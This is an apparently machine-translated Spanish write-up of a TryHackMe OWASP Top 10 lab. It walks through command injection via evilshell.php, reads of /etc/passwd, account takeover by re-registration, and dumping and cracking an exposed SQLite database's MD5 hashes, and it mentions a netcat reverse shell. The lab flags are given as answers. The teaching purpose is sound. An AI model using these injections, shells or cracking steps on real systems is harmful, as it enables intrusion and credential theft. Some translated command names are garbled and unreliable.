Top 10 de OWASP

Aprenda una de las vulnerabilidades de OWASP todos los días durante 10 días seguidos.


- Inyección
- Inyección de comandos del sistema operativo
- Inyección de comandos
- Autenticación rota
- Exposición de datos confidenciales
- Entidad externa XML
- Control de acceso roto
- Configuración incorrecta de seguridad
- Secuencias de comandos entre sitios
- Deserialización insegura
- Vulnerabilidades conocidas
- Registro y monitoreo insuficientes

## [](#appendix-archive)Archivo de apéndices

Contraseña:`1 kn0w 1 5h0uldn'7!`

## [](#task-1-introduction)[Tarea 1] Introducción

[![Proyecto de seguridad de aplicaciones web abiertas](https://user-content.gitlab-static.net/3dab7448038f693034d9ee414de5df6395a6f005/68747470733a2f2f692e696d6775722e636f6d2f51596739376a522e706e67)](https://user-content.gitlab-static.net/3dab7448038f693034d9ee414de5df6395a6f005/68747470733a2f2f692e696d6775722e636f6d2f51596739376a522e706e67)

**[OWASP Top 10 - Un desafío todos los días durante 10 días]**

Aprenda una de las vulnerabilidades de OWASP todos los días durante 10 días seguidos. Cada día se revelará una nueva tarea, donde cada tarea será independiente de la anterior. Estos desafíos cubrirán cada tema de OWASP:

- Día 1) Inyección
- Día 2) Autenticación rota
- Día 3) Exposición de datos confidenciales
- Día 4) Entidad Externa XML
- Día 5) Control de acceso roto
- Día 6) Error de configuración de seguridad
- Día 7) Secuencias de comandos entre sitios
- Día 8) Deserialización insegura
- Día 9) Componentes con vulnerabilidades conocidas
- Día 10) Registro y monitoreo insuficientes

Los desafíos están diseñados para principiantes y no suponen ningún conocimiento previo de seguridad.

1. Lea lo anterior.

`No answer needed`

## [](#task-2-accessing-machines)[Tarea 2] Acceso a máquinas

1. Practique conectarse a nuestra red.

`No answer needed`

## [](#task-3-daily-prizes)[Tarea 3] Premios diarios

`No answer needed`

## [](#task-4-day-1-injection)[Tarea 4] [Día 1] Inyección

Los defectos de inyección son muy comunes en las aplicaciones actuales. Estas fallas ocurren porque la aplicación interpreta la entrada controlada por el usuario como comandos o parámetros reales. Los ataques de inyección dependen de las tecnologías que se utilizan y de cómo estas tecnologías interpretan exactamente la entrada. Algunos ejemplos comunes incluyen:

- Inyección SQL: esto ocurre cuando la entrada controlada por el usuario se pasa a las consultas SQL. Como resultado, un atacante puede pasar consultas SQL para manipular el resultado de dichas consultas.
- Inyección de comandos: esto ocurre cuando la entrada del usuario se pasa a los comandos del sistema. Como resultado, un atacante puede ejecutar comandos arbitrarios del sistema en los servidores de aplicaciones.

Si un atacante puede pasar con éxito una entrada que se interprete correctamente, podría hacer lo siguiente:

- Acceda, modifique y elimine información en una base de datos cuando esta entrada se pasa a las consultas de la base de datos. Esto significaría que un atacante puede robar información confidencial, como datos personales y credenciales.
- Ejecutar comandos arbitrarios del sistema en un servidor que permitiría a un atacante obtener acceso a los sistemas de los usuarios. Esto les permitiría robar datos confidenciales y realizar más ataques contra la infraestructura vinculada al servidor en el que se ejecuta el comando.

La principal defensa para prevenir ataques de inyección es garantizar que la entrada controlada por el usuario no se interprete como consultas o comandos. Hay diferentes maneras de hacer esto:

- Uso de una lista de permitidos: cuando la entrada se envía al servidor, esta entrada se compara con una lista de entradas o caracteres seguros. Si la entrada está marcada como segura, entonces se procesa. En caso contrario, se rechaza y la aplicación arroja un error.
    
- Eliminación de entrada: si la entrada contiene caracteres peligrosos, estos caracteres se eliminan antes de que se procesen.
    
- Los caracteres o entradas peligrosos se clasifican como cualquier entrada que pueda cambiar la forma en que se procesan los datos subyacentes. En lugar de construir manualmente listas de permitidos o simplemente eliminar la entrada, existen varias bibliotecas que realizan estas acciones por usted.
    

1. He entendido los ataques de inyección.

`No answer needed`

## [](#task-5-day-1-os-command-injection)[Tarea 5] [Día 1] Inyección de comandos del sistema operativo

La inyección de comandos ocurre cuando el código del lado del servidor (como PHP) en una aplicación web realiza una llamada al sistema en la máquina de alojamiento. Es una vulnerabilidad web que permite a un atacante aprovechar esa llamada al sistema realizada para ejecutar comandos del sistema operativo en el servidor. A veces, esto no siempre terminará en algo malicioso, como una `whoami`o simplemente lectura de archivos. Eso no es tan malo. Pero lo que pasa con la inyección de comandos es que abre muchas opciones para el atacante. Lo peor que podrían hacer sería generar un shell inverso para convertirse en el usuario con el que se ejecuta el servidor web. Un simple `;nc -e /bin/bash`es todo lo que se necesita y son dueños de su servidor. **algunas variantes de netcat no admiten la opción -e.** Puede usar una lista de [estos](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) shells inversos como alternativa.

Una vez que el atacante tiene un punto de apoyo en el servidor web, puede comenzar la enumeración habitual de sus sistemas y comenzar a buscar formas de cambiar. Ahora que sabemos qué es la inyección de comandos, comenzaremos a analizar los diferentes tipos y cómo probarlos.

1. He entendido la inyección de comandos.

`No answer needed`

## [](#task-6-day-1-command-injection-practical)[Tarea 6] [Día 1] Práctica de inyección de comandos

**¿Qué es la inyección de comando activo?**

La inyección de comando ciego se produce cuando el comando del sistema realizado en el servidor no devuelve la respuesta al usuario en el documento HTML. La inyección de comando activo devolverá la respuesta al usuario. Se puede hacer visible a través de varios elementos HTML.

Consideremos un escenario: EvilCorp ha comenzado el desarrollo en un shell basado en web, pero accidentalmente lo ha dejado expuesto a Internet. ¡No está ni cerca de terminar, pero contiene la misma vulnerabilidad de inyección de comandos que antes! ¡Pero esta vez, la respuesta de la llamada al sistema se puede ver en la página! ¡Nunca aprenderán!

Al igual que antes, veamos el código de muestra de evilshell.php y repasemos lo que está haciendo y por qué activa la inyección de comandos. A ver si puedes resolverlo. Voy a repasarlo a continuación como antes.

**Ejemplo de código de EvilShell (evilshell.php)**

[![evilshell.php](https://user-content.gitlab-static.net/bb36d3a8d8144d8f9cc9d857706064f34f96b1b3/68747470733a2f2f692e696d6775722e636f6d2f4b6347697a646f2e706e67)](https://user-content.gitlab-static.net/bb36d3a8d8144d8f9cc9d857706064f34f96b1b3/68747470733a2f2f692e696d6775722e636f6d2f4b6347697a646f2e706e67)

En pseudocódigo, el fragmento anterior hace lo siguiente:

1. Comprobando si el parámetro "commandString" está configurado
2. Si es así, la variable `$command_string`obtiene lo que se pasó al campo de entrada
3. Luego, el programa entra en un bloque de prueba para ejecutar la función `passthru($command_string)`. Puede leer los documentos en `passthru()`el [sitio web de PHP](https://www.php.net/manual/en/function.passthru.php) , pero en general, ejecuta lo que se ingresa en la entrada y luego pasa la salida directamente al navegador.
4. Si el intento no tiene éxito, envíe el error a la página. En general, esto no generará nada porque no puede generar stderr, pero PHP no le permite intentarlo sin problemas.

**Formas de detectar la inyección de comando activo**

Sabemos que la inyección de comando activo ocurre cuando puede ver la respuesta de la llamada al sistema. En el código anterior, la función `passthru()`es en realidad lo que está haciendo todo el trabajo aquí. Está pasando la respuesta directamente al documento para que pueda ver los frutos de su trabajo allí mismo. Como sabemos eso, podemos repasar algunos comandos útiles para tratar de enumerar la máquina un poco más. La llamada a la función aquí `passthru()`puede no ser siempre lo que sucede detrás de escena, pero sentí que era la forma más fácil y menos complicada de demostrar la vulnerabilidad.

**Comandos para probar**

**linux**

- quién soy
- identificación
- ifconfig/dirección IP
- uname -a
- pd-ef

**ventanas**

- quién soy
- ver
- ipconfig
- lista de tareas
- netstat-an

Para completar las preguntas a continuación, vaya a [http://MACHINE_IP/evilshell.php](http://MACHINE_IP/evilshell.php) .

1. ¿Qué extraño archivo de texto hay en el directorio raíz del sitio web?

`http://10.10.175.234/evilshell.php?commandString=ls+-la`

```
total 28 drwxr-x--- 4 www-data www-data 4096 Jun 3 18:13 . drwxr-xr-x 3 root root 4096 May 18 15:21 .. drwxr-x--- 2 www-data www-data 4096 May 21 03:04 css -rw-r----- 1 www-data www-data 17 May 22 13:14 drpepper.txt -rw-r----- 1 www-data www-data 1723 May 26 01:52 evilshell.php -rw-r----- 1 www-data www-data 2200 May 21 03:04 index.php drwxr-x--- 2 www-data www-data 4096 May 21 03:04 js
```

`drpepper.txt`

2. ¿Cuántos usuarios que no son root/no son de servicio/no son daemon hay?

`sudo grep '/home/' /etc/passwd | cut -d: -f1`

`http://10.10.175.234/evilshell.php?commandString=sudo+grep+%27%2Fhome%2F%27+%2Fetc%2Fpasswd+%7C+cut+-d%3A+-f1`

`sudo grep '/bin/bash' /etc/passwd | cut -d: -f1`

`http://10.10.175.234/evilshell.php?commandString=sudo+grep+%27%2Fbin%2Fbash%27+%2Fetc%2Fpasswd+%7C+cut+-d%3A+-f1`

`0`

3. ¿Con qué usuario se ejecuta esta aplicación?

`http://10.10.175.234/evilshell.php?commandString=whoami`

`www-data`

4. ¿Cómo está configurado el shell del usuario?

`http://10.10.175.234/evilshell.php?commandString=cat+%2Fetc%2Fpasswd`

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

`/usr/sbin/nologin`

5. ¿Qué versión de Ubuntu se está ejecutando?

`http://10.10.175.234/evilshell.php?commandString=lsb_release+-a`

```
Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic
```

`18.04.4`

6. Imprime el MOTD. ¿Qué bebida favorita se muestra?

`http://10.10.175.234/evilshell.php?commandString=cat+%2Fetc%2Fupdate-motd.d%2F00-header`

```
#!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)" DR PEPPER MAKES THE WORLD TASTE BETTER!
```

`DR PEPPER`

## [](#task-7-day-2-broken-authentication)[Tarea 7] [Día 2] Autenticación rota

[![](https://user-content.gitlab-static.net/f551256776d612d5a9c52f83069eb6b525f07522/68747470733a2f2f692e696d6775722e636f6d2f34397034426b492e706e67)](https://user-content.gitlab-static.net/f551256776d612d5a9c52f83069eb6b525f07522/68747470733a2f2f692e696d6775722e636f6d2f34397034426b492e706e67)

La autenticación y la gestión de sesiones constituyen componentes centrales de las aplicaciones web modernas. La autenticación permite a los usuarios obtener acceso a las aplicaciones web mediante la verificación de sus identidades. La forma más común de autenticación es mediante un mecanismo de nombre de usuario y contraseña. Un usuario ingresaría estas credenciales, el servidor las verificaría. Si son correctos, el servidor proporcionará al navegador de los usuarios una cookie de sesión. Se necesita una cookie de sesión porque los servidores web usan HTTP(S) para comunicarse, lo cual no tiene estado. Adjuntar cookies de sesión significa que el servidor sabrá quién está enviando qué datos. El servidor puede realizar un seguimiento de las acciones de los usuarios.

Si un atacante puede encontrar fallas en un mecanismo de autenticación, entonces obtendrá acceso con éxito a las cuentas de otros usuarios. Esto permitiría al atacante acceder a datos confidenciales (dependiendo del propósito de la aplicación). Algunas fallas comunes en los mecanismos de autenticación incluyen:

- Ataques de fuerza bruta: si una aplicación web usa nombres de usuario y contraseñas, un atacante puede lanzar ataques de fuerza bruta que le permiten adivinar el nombre de usuario y las contraseñas mediante múltiples intentos de autenticación.
- Uso de credenciales débiles: las aplicaciones web deben establecer políticas de contraseñas seguras. Si las aplicaciones permiten a los usuarios establecer contraseñas como 'contraseña1' o contraseñas comunes, entonces un atacante puede adivinarlas fácilmente y acceder a las cuentas de los usuarios. Pueden hacer esto sin fuerza bruta y sin múltiples intentos.
- Cookies de sesión débiles: las cookies de sesión son la forma en que el servidor realiza un seguimiento de los usuarios. Si las cookies de sesión contienen valores predecibles, un atacante puede establecer sus propias cookies de sesión y acceder a las cuentas de los usuarios.

Puede haber varias mitigaciones para los mecanismos de autenticación rotos dependiendo de la falla exacta:

- Para evitar ataques de adivinación de contraseñas, asegúrese de que la aplicación aplique una política de contraseña segura.
- Para evitar ataques de fuerza bruta, asegúrese de que la aplicación aplique un bloqueo automático después de una cierta cantidad de intentos. Esto evitaría que un atacante lance más ataques de fuerza bruta.
- Implemente la autenticación multifactor: si un usuario tiene varios métodos de autenticación, por ejemplo, usar un nombre de usuario y contraseñas y recibir un código en su dispositivo móvil, sería difícil para un atacante obtener acceso a ambas credenciales para acceder a su cuenta. .

1. He entendido los mecanismos de autenticación rotos.

`No answer needed`

## [](#task-8-day-2-broken-authentication-practical)[Tarea 8] [Día 2] Práctica de autenticación rota

Para este ejemplo, veremos una falla lógica dentro del mecanismo de autenticación.

Muchas veces, lo que sucede es que los desarrolladores se olvidan de desinfectar la entrada (nombre de usuario y contraseña) proporcionada por el usuario en el código de su aplicación, lo que puede hacerlos vulnerables a ataques como la inyección de SQL. Sin embargo, nos vamos a centrar en una vulnerabilidad que ocurre debido a un error del desarrollador pero que es muy fácil de explotar, es decir, volver a registrar a un usuario existente.

Entendamos esto con la ayuda de un ejemplo, digamos que hay un usuario existente con el nombre **admin** y ahora queremos obtener acceso a su cuenta, así que lo que podemos hacer es intentar volver a registrar ese nombre de usuario pero con una ligera modificación. Vamos a entrar `admin`(observe el espacio en el inicio). Ahora, cuando ingrese eso en el campo de nombre de usuario e ingrese otra información requerida como identificación de correo electrónico o contraseña y envíe esos datos. De hecho, registrará un nuevo usuario, pero ese usuario tendrá los mismos derechos que un administrador normal. Ese nuevo usuario también podrá ver todo el contenido presentado bajo el **administrador** de usuarios .

Para ver esto en acción, vaya a [http://MACHINE_IP:8888](http://MACHINE_IP:8888) e intente registrar un nombre de usuario **darren** , verá que el usuario ya existe, entonces intente registrar un usuario `darren`y verá que ahora está conectado y podrá ver el contenido presente solo en la cuenta de Darren, que en nuestro caso es la bandera que necesita recuperar.

1. ¿Cuál es la bandera que encontraste en la cuenta de Darren?

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-34.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-34.png)

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-36.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-36.png)

- [ver-fuente:http://10.10.39.247:8888/logged](view-source:http://10.10.39.247:8888/logged)

```
<p style="font-size: 100%; text-align: left; color:white">
  fe86079416a21a3c99937fea8874b667
</p>
```

`fe86079416a21a3c99937fea8874b667`

2. Ahora intente hacer el mismo truco y vea si puede iniciar sesión como **arthur** .

`No answer needed`

3. ¿Cuál es la bandera que encontraste en la cuenta de Arthur?

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-38.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-38.png)

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-39.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_08-39.png)

```
<p style="font-size: 100%; text-align: left; color:white">
  d9ac0f7db4fda460ac3edeb75d75e16e
</p>
```

`d9ac0f7db4fda460ac3edeb75d75e16e`

## [](#task-9-day-3-sensitive-data-exposure-introduction)[Tarea 9] [Día 3] Exposición de datos confidenciales (Introducción)

Cuando una aplicación web divulga accidentalmente datos confidenciales, nos referimos a ellos como " **Exposición de datos confidenciales** ". A menudo se trata de datos directamente vinculados a los clientes (por ejemplo, nombres, fechas de nacimiento, información financiera, etc.), pero también podría ser información más técnica, como nombres de usuario y contraseñas. En niveles más complejos, esto a menudo implica técnicas como " **Man in The Middle Attack".**", mediante el cual el atacante forzaría las conexiones de los usuarios a través de un dispositivo que controlan, luego aprovecharía el cifrado débil en cualquier dato transmitido para obtener acceso a la información interceptada (si los datos están cifrados en primer lugar...). De Por supuesto, muchos ejemplos son mucho más simples y se pueden encontrar vulnerabilidades en las aplicaciones web que se pueden explotar sin ningún conocimiento avanzado de redes. De hecho, en algunos casos, los datos confidenciales se pueden encontrar directamente en el propio servidor web...

La aplicación web de este cuadro contiene una de esas vulnerabilidades. Implemente la máquina, luego lea el material de apoyo en las siguientes tareas a medida que se inicia la caja.

1. Lea la introducción a la exposición de datos confidenciales e implemente la máquina.

`No answer needed`

## [](#task-10-day-3-sensitive-data-exposure-supporting-material-1)[Tarea 10] [Día 3] Exposición de datos confidenciales (Material de apoyo 1)

La forma más común de almacenar una gran cantidad de datos en un formato al que se puede acceder fácilmente desde muchas ubicaciones a la vez es en una base de datos. Obviamente, esto es perfecto para algo como una aplicación web, ya que puede haber muchos usuarios interactuando con el sitio web en cualquier momento. Los motores de bases de datos suelen seguir la sintaxis del lenguaje de consulta estructurado (SQL); sin embargo, los formatos alternativos (como NoSQL) están ganando popularidad.

En un entorno de producción es común ver bases de datos configuradas en servidores dedicados, ejecutando un servicio de base de datos como MySQL o MariaDB; sin embargo, las bases de datos también se pueden almacenar como archivos. Estas bases de datos se conocen como bases de datos de "archivo plano", ya que se almacenan como un solo archivo en la computadora. Esto es mucho más fácil que configurar un servidor de base de datos completo y, por lo tanto, podría verse potencialmente en aplicaciones web más pequeñas. Acceder a un servidor de base de datos está fuera del alcance de la tarea de hoy, así que centrémonos en las bases de datos de archivos sin formato.

Como se mencionó anteriormente, las bases de datos de archivos planos se almacenan como un archivo en el disco de una computadora. Por lo general, esto no sería un problema para una aplicación web, pero ¿qué sucede si la base de datos se almacena debajo del directorio raíz del sitio web (es decir, uno de los archivos a los que puede acceder un usuario que se conecta al sitio web)? Bueno, podemos descargarlo y consultarlo en nuestra propia máquina, con acceso completo a todo en la base de datos. ¡Exposición de datos confidenciales de hecho!

Esa es una gran pista para el desafío, así que cubramos brevemente parte de la sintaxis que usaríamos para consultar una base de datos de archivo sin formato.

El formato más común (y más simple) de base de datos de archivo plano es una base de datos sqlite. Se puede interactuar con ellos en la mayoría de los lenguajes de programación y tienen un cliente dedicado para consultarlos en la línea de comandos. Este cliente se llama "sqlite3" y está instalado de forma predeterminada en Kali.

Supongamos que hemos logrado descargar con éxito una base de datos:

[![](https://user-content.gitlab-static.net/b2a31787a8e82de8aad6539c58b72e976b7ad9ee/68747470733a2f2f692e696d6775722e636f6d2f746d52686352452e706e67)](https://user-content.gitlab-static.net/b2a31787a8e82de8aad6539c58b72e976b7ad9ee/68747470733a2f2f692e696d6775722e636f6d2f746d52686352452e706e67)

Podemos ver que hay una base de datos SQlite en la carpeta actual.

Para acceder a ella usamos: `sqlite3 <database-name>`:

[![](https://user-content.gitlab-static.net/d7c85d92e75284f79e6168e9b3b0aa6170525068/68747470733a2f2f692e696d6775722e636f6d2f4b4a48416449332e706e67)](https://user-content.gitlab-static.net/d7c85d92e75284f79e6168e9b3b0aa6170525068/68747470733a2f2f692e696d6775722e636f6d2f4b4a48416449332e706e67)

Desde aquí podemos ver las tablas en la base de datos usando el `.tables`comando:

[![](https://user-content.gitlab-static.net/d9564710fcbeb7ac823c5a75c66f041a1ad0857b/68747470733a2f2f692e696d6775722e636f6d2f6b7949576c31712e706e67)](https://user-content.gitlab-static.net/d9564710fcbeb7ac823c5a75c66f041a1ad0857b/68747470733a2f2f692e696d6775722e636f6d2f6b7949576c31712e706e67)

En este punto, podemos volcar todos los datos de la tabla, pero no necesariamente sabremos qué significa cada columna a menos que miremos la información de la tabla. Primero usemos `PRAGMA table_info(customers);`para ver la información de la tabla, luego usaremos `SELECT * FROM customers;`para volcar la información de la tabla:

[![](https://user-content.gitlab-static.net/44a38faed908cfdaaf6398c03170cd66b82b42a9/68747470733a2f2f692e696d6775722e636f6d2f775676486b37612e706e67)](https://user-content.gitlab-static.net/44a38faed908cfdaaf6398c03170cd66b82b42a9/68747470733a2f2f692e696d6775722e636f6d2f775676486b37612e706e67)

Podemos ver en la información de la tabla que hay cuatro columnas: custID, custName, creditCard y contraseña. Puede notar que esto coincide con los resultados. Tome la primera fila:

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`

Tenemos el custID (0), el custName (Joy Paulson), la tarjeta de crédito (4916 9012 2231 7905) y un hash de contraseña (5f4dcc3b5aa765d61d8327deb882cf99).

En la siguiente tarea, veremos cómo descifrar este hash.

1. Lea y comprenda el material de apoyo sobre las bases de datos SQLite.

## [](#task-11-day-3-sensitive-data-exposure-supporting-material-2)[Tarea 11] [Día 3] Exposición de datos confidenciales (Material de apoyo 2)

En la tarea anterior, vimos cómo consultar una base de datos SQLite en busca de datos confidenciales. Encontramos una colección de hashes de contraseña, uno para cada usuario. En esta tarea, cubriremos brevemente cómo descifrarlos.

Cuando se trata de descifrar hash, Kali viene preinstalado con varias herramientas; si sabe cómo usarlas, no dude en hacerlo; sin embargo, están fuera del alcance de este material.

En su lugar, utilizaremos la herramienta en línea: [Crackstation](https://crackstation.net/) . Este sitio web es extremadamente bueno para descifrar hashes de contraseñas débiles. Para hashes más complicados necesitaríamos herramientas más sofisticadas; sin embargo, todos los hashes de contraseñas descifrables utilizados en el desafío de hoy son hashes MD5 débiles, que Crackstation debería manejar muy bien.

Cuando navegamos al sitio web nos encontramos con la siguiente interfaz:

[![](https://user-content.gitlab-static.net/042908d94a6d66ee6a2dd2e5135054137e377c1b/68747470733a2f2f692e696d6775722e636f6d2f6f696f6c65636b2e706e67)](https://user-content.gitlab-static.net/042908d94a6d66ee6a2dd2e5135054137e377c1b/68747470733a2f2f692e696d6775722e636f6d2f6f696f6c65636b2e706e67)

Intentemos pegar el hash de la contraseña de Joy Paulson que encontramos en la tarea anterior ( `5f4dcc3b5aa765d61d8327deb882cf99`). Resolvemos el Captcha, luego hacemos clic en el botón "Crack Hashes":

[![](https://user-content.gitlab-static.net/3aa215502c83b54934b20d622245db2d98e6c29d/68747470733a2f2f692e696d6775722e636f6d2f4b77484d4747562e706e67)](https://user-content.gitlab-static.net/3aa215502c83b54934b20d622245db2d98e6c29d/68747470733a2f2f692e696d6775722e636f6d2f4b77484d4747562e706e67)

Vemos que el hash se descifró con éxito y que la contraseña del usuario era "contraseña". ¡Qué seguridad!

Vale la pena señalar que Crackstation funciona con una lista de palabras masiva. Si la contraseña no está en la lista de palabras, Crackstation no podrá descifrar el hash.

El desafío es guiado, por lo que si Crackstation no logra descifrar un hash en la caja de hoy, puede asumir que el hash se ha diseñado específicamente para que no se pueda descifrar.

1. Lea el material de apoyo sobre cómo descifrar hashes.

## [](#task-12-day-3-sensitive-data-exposure-challenge)[Tarea 12] [Día 3] Exposición de datos confidenciales (desafío)

Ahora es el momento de poner en práctica lo que has aprendido con el desafío de hoy.

Para animar un poco las cosas, además del habitual sorteo diario, esta caja también alberga un premio especial: un vale para una suscripción de un mes a TryHackMe. Puede que haya o no otra pista escondida en la caja, en caso de que la necesites, pero por el momento aquí hay un punto de partida: las cajas son aburridas, escápate de ellas en cada oportunidad.

`10.10.45.163`

1. Eche un vistazo a la aplicación web. El desarrollador se ha dejado una nota indicando que hay datos confidenciales en un directorio específico. ¿Cuál es el nombre del directorio mencionado?

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.45.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 20:26:22 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/api (Status: 301)
/assets (Status: 301)
/console (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/login (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/26 20:26:48 Finished
===============================================================
```

`/assets`

2. Navegue hasta el directorio que encontró en la pregunta uno. ¿Qué archivo se destaca por ser probable que contenga datos confidenciales?

- [Índice de /activos](http://10.10.45.163/assets/)

`webapp.db`

1. Utilice el material de apoyo para acceder a los datos confidenciales. ¿Cuál es el hash de la contraseña del usuario administrador?

```
wget http://10.10.45.163/assets/webapp.db

file webapp.db
webapp.db: SQLite 3.x database, last written using SQLite version 3022000
```

```
sqlite3 webapp.db

SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
sessions  users
sqlite>
```

```
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
```

```
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
```

`6eea9b7ef19179a06954edd0f6c05ceb`

2. Rompe el hachís. ¿Cuál es la contraseña de texto sin formato del administrador?

```
hashid 6eea9b7ef19179a06954edd0f6c05ceb

Analyzing '6eea9b7ef19179a06954edd0f6c05ceb'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin.hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
qwertyuiop       (?)
1g 0:00:00:00 DONE (2020-09-26 20:35) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

`qwertyuiop`

3. Inicie sesión como administrador. ¿Qué es la bandera?

- [Acceso](http://10.10.45.163/login/)
- administrador:qwertyuiop
- [ver-fuente:http://10.10.45.163/console/](view-source:http://10.10.45.163/console/)

```
<div class="flag">
  <p>
    Well done.<br />Your flag is:
    <code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code>
  </p>
</div>
```

`THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

## [](#day-4-xml-external-entity)[Día 4] Entidad externa XML

[![](https://user-content.gitlab-static.net/651ae038f2d414ea3e65149e5924810de2cd02ca/68747470733a2f2f7777772e6163756e657469782e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031372f30372f5858455f363030783331352e706e67)](https://user-content.gitlab-static.net/651ae038f2d414ea3e65149e5924810de2cd02ca/68747470733a2f2f7777772e6163756e657469782e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031372f30372f5858455f363030783331352e706e67)

Un ataque de entidad externa XML (XXE) es una vulnerabilidad que abusa de las características de los analizadores/datos XML. A menudo, permite que un atacante interactúe con cualquier back-end o sistema externo al que pueda acceder la aplicación y puede permitir que el atacante lea el archivo en ese sistema. También pueden causar un ataque de denegación de servicio (DoS) o podrían usar XXE para realizar una falsificación de solicitud del lado del servidor (SSRF) que induce a la aplicación web a realizar solicitudes a otras aplicaciones. XXE puede incluso habilitar el escaneo de puertos y conducir a la ejecución remota de código.

Hay dos tipos de ataques XXE: dentro de banda y fuera de banda (OOB-XXE).

1. Un ataque XXE en banda es aquel en el que el atacante puede recibir una respuesta inmediata a la carga útil XXE.
2. ataques XXE fuera de banda (también llamados XXE ciegos), no hay una respuesta inmediata de la aplicación web y el atacante tiene que reflejar la salida de su carga útil XXE en algún otro archivo o en su propio servidor.

